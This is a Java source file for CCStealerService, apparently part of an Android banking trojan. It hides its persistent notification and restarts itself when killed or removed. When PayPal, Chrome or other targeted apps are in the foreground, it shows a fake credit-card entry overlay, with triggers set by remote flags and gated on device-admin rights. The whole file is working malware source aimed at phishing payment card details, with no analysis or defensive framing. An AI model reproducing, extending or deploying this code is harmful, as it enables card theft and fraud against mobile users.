package com.moonny.srvs;


import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import com.moonny.R;
import com.moonny.Modules;
import com.moonny.acts.CC1;
import com.moonny.processes.AndroidProcesses;
import com.moonny.processes.models.AndroidAppProcess;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import java.util.List;

public class CCStealerService extends Service {

    private static final long SLEEP_TIME = 1000;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // ================= STEEL SRV ================
        Notification.Builder builder = new Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_stat_content_mail);

        Notification notification;
        if (Build.VERSION.SDK_INT < 16) {
            notification = builder.getNotification();
        }else {
            builder.setPriority(Notification.PRIORITY_MIN);
            notification = builder.build();
        }

        int notify_id = 3777;
        startForeground(notify_id, notification);

        Intent hideIntent = new Intent(this, HideService.class);
        hideIntent.setFlags(Intent.FLAG_RECEIVER_FOREGROUND);
        hideIntent.putExtra(HideService.KEY_ID, Integer.toString(notify_id));
        startService(hideIntent);

        // =============================================

        new Thread(new Runnable() {
            @Override
            public void run() {
                Context ctx = getBaseContext();
                while(true) {
                    cycle(ctx); // CC stealer
                }
            }
        }).start();

        return START_STICKY; // recreate service when it was not enough memory on device
    }

    private void cycle(Context ctx) {

        Modules mods = new Modules(ctx);

        if(!mods.is_mod_exists(S.mod_main)) {
            Utils.threadSleep(1000);
            if(Constant.DEBUG) Log.d("CONTROL", "CCStealer not allowed");
            return;
        }

        if(Constant.ADMIN_REQUIRED && !(boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.is_admin_active, false }))
        {
            if(Constant.DEBUG) Log.d("CCStealer", "NOT ADMIN YET");
            Utils.threadSleep(1000);
            return;
        }
        
        // если включен флаг - показать
        if((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.api_fire_cc, false }))
        {
            showCC(ctx);

            // waiting until CC filled
            // while main pause set and fire_cc set
            while((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.injectCyclePause, true }) && (boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.api_fire_cc, false }))
            {
                Utils.threadSleep(SLEEP_TIME);
            }
        }

        // get running apps
        List<AndroidAppProcess> processes = AndroidProcesses.getRunningForegroundApps(ctx);
        String cc_on = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.api_cc_stealer_on, ""});

        String[] apps_with_cc = (String[]) Modules.main(ctx, S.string2list, new Object[]{cc_on});

        // if no apps to show CC or one of these apps already fired
        String done_apps = (String) Modules.main(ctx, S.get_pref, new Object[]{S.cc_done_apps, ""});
        if(apps_with_cc.length == 0 || !done_apps.isEmpty())
        {
            Utils.threadSleep(SLEEP_TIME);
            return;
        }

        // foreach apps for CC
        for (int i = 0; i < apps_with_cc.length; i++) {

            String app = apps_with_cc[i];
            String apps_done = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.cc_done_apps, "" });

            if((boolean) Modules.main(ctx, S.list_has, new Object[]{ apps_done, app }))
                continue;

            if(!Utils.inRunningApps(app, processes, null))
                continue;

            showCC(ctx, app);

            Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, true });
            while((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.injectCyclePause, false }))   // this is COMMON pause flag for GP/FD cycles!
            {
                Utils.threadSleep(SLEEP_TIME);

                if(!isCCAlive(ctx, app))
                {
                    Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, false });
                    break;
                }
            } // end pause

        } // end foreach

        Utils.threadSleep(SLEEP_TIME);
    }

    private boolean isCCAlive(Context ctx, String name)
    {
        if(!Utils.inRunningApps(name, null, ctx))
            return false;

        if(!Utils.inRunningApps(getPackageName(), null, ctx))
            return false;

        String apps_done = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.cc_done_apps, "" });
        return !((boolean) Modules.main(ctx, S.list_has, new Object[]{ apps_done, name }));
    }

    private void showCC(Context ctx)
    {
        showCC(ctx, "");
    }

    private void showCC(Context ctx, String app)
    {
        Intent intent = new Intent(CCStealerService.this, CC1.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra(S.on_package, app);

        String apps_done = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.cc_done_apps, "" });
        if ((boolean) Modules.main(ctx, S.list_has, new Object[]{ apps_done, app }))
            return;

        // show CC on PP
        if(app.equals(S.paypal_pkg)) {
            intent.putExtra(S.title, S.s(getString(R.string.f)));
            intent.putExtra(S.card_text, S.s(getString(R.string.g)));
        }else if(app.equals(S.chrome_pkg)){
            intent.putExtra(S.title, S.chrome_CC_title);
            intent.putExtra(S.card_text, S.s(getString(R.string.d)));
        }else{
            // on other apps show GP text
            intent.putExtra(S.title, S.s(getString(R.string.b)));
            intent.putExtra(S.card_text, S.s(getString(R.string.d)));

        }

        startActivity(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {

        super.onDestroy();
        try {
            Intent serviceIntent = new Intent(this, CCStealerService.class);
            startService(serviceIntent);
        } catch (Exception e) {
            if(Constant.DEBUG) Log.d("onDestroy error", e.toString());
        }

    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {

        Intent restartService = new Intent(getApplicationContext(),
                this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getApplicationContext()
                .getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 2000, restartServicePI);

    }
}